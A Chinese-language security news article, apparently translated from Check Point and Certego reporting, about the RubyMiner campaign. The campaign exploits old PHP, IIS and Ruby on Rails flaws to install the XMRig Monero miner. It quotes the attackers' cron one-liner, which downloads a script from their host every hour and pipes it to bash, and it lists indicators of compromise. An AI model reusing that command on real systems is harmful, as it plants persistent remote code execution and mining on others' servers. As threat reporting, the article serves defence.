@@ -1,0 +1,35 @@
+近日，Check Point 的安全研究人员发现了 RubyMiner 恶意软件家族，针对全球的 web 服务器发起攻击，并试图利用这些服务器挖掘门罗币。24 小时内，全球 30% 的网络都受到影响。
+上周，全球 web 服务器遭遇了一场大规模攻击，就在那时 RubyMiner 首次进入大众视野。专家认为，此次攻击背后的主要操控者只有一个人，尽在一天之内就尝试入侵了全球近三分之一的网络。
+在过去的24小时内，全球 30％ 的网络都遭遇了针对 web 服务器的加密货币挖矿攻击。在此期间，该攻击者试图扫描全球网络，从中找到易受攻击的 web 服务器用于挖矿。主要受影响的国家是美国、德国、英国、挪威和瑞典，但全球其他国家也未能幸免。
+意大利安全公司 Certego 也注意到 RubyMiner 从 1 月 10 日就开始发起攻击：
+从昨天（1月10日）23:00开始，我们的威胁情报平台就已经开始大规模报告关于 ruby http 的利用。令人惊讶的是，黑客大量使用 2012 年和 2013 年发布和修补的旧漏洞，而且似乎并不打算隐藏自己的踪迹，而是打算在最短的时间内感染大量的服务器。攻击者选择利用 HTTP Web 服务器中的多个漏洞，分发开源的 Monero 挖矿程序 XMRig。XMRig 在 2017 年 9 月利用 Microsoft IIS 6.0（Windows Server 2003 R2 中的 Web 服务器）中的漏洞进行攻击。XMRig 通常会向开源代码的作者捐赠 5％ 的挖矿所得。然而，攻击者可能觉得 5% 也还是太多，因此从代码中删除了“捐赠元素”，将所有利润据为己有。
+RubyMiner 影响范围包括 Windows 服务器也包括 Linux 服务器，主要利用 PHP、 Microsoft IIS 和 Ruby on Rails 中的漏洞来部署挖矿软件。Certego 的分析报告显示，恶意程序一直在利用 Ruby on Rails 中一个可造成远程代码执行的古老 CVE（CVE-2013-0156）漏洞。
+PHP 服务器攻击向量
+Ruby on Rails 攻击向量
+RubyMiner 的具体攻击过程如下：
+攻击者在 POST 请求内发送一个 base64 编码的有效载荷，并诱导解释器执行该有效载荷。这个恶意的有效载荷是一个 bash 脚本，其中添加了一个每小时运行一次的定时任务 cronjob，同时还下载了一个包含 shell 脚本的 robots.txt 文件，用于获取并执行挖矿软件。随后调度程序执行命令，运行整个过程（包括每小时从服务器下载文件）。
+cron 是一个基于 UNIX 的调度程序，可以通过自己的语法在固定的时间运行计划好的任务。 使用 -r 参数运行 crontab 命令将删除现有 crontab 中的所有现有任务，并允授予矿工全部优先级。
+echo “1 * * * * wget -q -O – http://internetresearch.is/robots.txt 2>/dev/null|bash >/dev/null 2>&1″|crontab –
+攻击者可以使用”1 * * * *“将新任务注入到干净的 crontab 文件中，进而命令调度器每小时无限运行一分钟。新任务将下载并执行“internetresearch.is”上托管的“robots.txt”文件，进而开始挖掘。
+正常的robots.txt
+攻击活动中的 robots.txt
+专家认为，robots.txt 文件也可以用作 RubyMiner 的 kill 开关，修改受感染 web 服务器上的 robots.txt 文件，进而关停 RubyMiner。
+（关闭开关后）一分钟之内，所有重新下载文件的计算机都将收到没有加密挖矿软件信息的文件。
+此外，攻击者所使用的一个域名“lochjol.com”在 2013 年也涉及到 Ruby on Rails 漏洞相关的攻击。
+文章发布时，全球大约有 700 台服务器在 24 小时的攻击中彻底中招。
+以下是 CheckPoint 发布的 RubyMiner 的 IOC 等相关信息：
+IoC
+攻击服务器及 Dropzones：
+203.24.188[.]242
+Internetresearch[.]is dgnfd564sdf[.]com lochjol[.]com
+Payloads：
+a6a57e6a216dff346a22f51639c4b99c
+91d31ed8e569c0089fa070ed125e1fc5 761f5cfd0a3cddb48c73bc341a4d07a9
+IPS 及反僵尸网络防护
+我们的 IPS 和 AB 保护已经成功地阻止了从第 0 天开始的相关攻击。我们将继续监视和研究任何额外的野外攻击。
+IPS 防护：
+PHP php-cgi 查询字符串参数代码执行 Ruby on Rails XML 处理器 YAML 反序列化代码执行 Microsoft IIS ASP 脚本源代码泄露
+AB 防护：
+Linux.RubyMiner.A
+点击此处可以获取 CheckPoint 的完整分析内容。
+*参考来源：SecurityAffairs，AngelaY 编译，转载请注明来自 FreeBuf.COM。
